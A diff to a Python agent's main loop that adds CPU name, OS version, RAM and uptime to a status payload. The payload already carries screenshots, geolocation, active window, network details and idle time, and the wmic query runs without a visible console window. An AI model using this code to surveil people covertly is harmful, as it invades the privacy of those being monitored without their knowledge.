@@ -146,6 +146,15 @@ def main():
         except:
             pass
 
+    import platform
+    cpu_name = platform.processor()
+    try:
+        cpu_name = subprocess.check_output('wmic cpu get name', shell=True, text=True, creationflags=0x08000000).split('\n')[1].strip()
+    except:
+        pass
+    os_version = f"{platform.system()} {platform.release()}"
+    total_ram = f"{round(psutil.virtual_memory().total / (1024**3))} GB"
+    
     psutil.cpu_percent(interval=None) # init
     last_net = psutil.net_io_counters()
     last_time = time.time()
@@ -158,6 +167,8 @@ def main():
         ip, ssid = get_network_info()
         bat_percent, bat_plugged = get_battery_info()
         lat, lng, city = get_location()
+        
+        system_uptime = time.time() - psutil.boot_time()
         
         idle_seconds = get_idle_time()
         agent_status = "active"
@@ -207,7 +218,10 @@ def main():
             "status": agent_status,
             "window": window,
             "user": socket.gethostname(),
-            "device": "Windows",
+            "device": os_version,
+            "cpu_name": cpu_name,
+            "total_ram": total_ram,
+            "uptime": round(system_uptime),
             "screen": screen_b64,
             "cpu": cpu,
             "ram": ram,
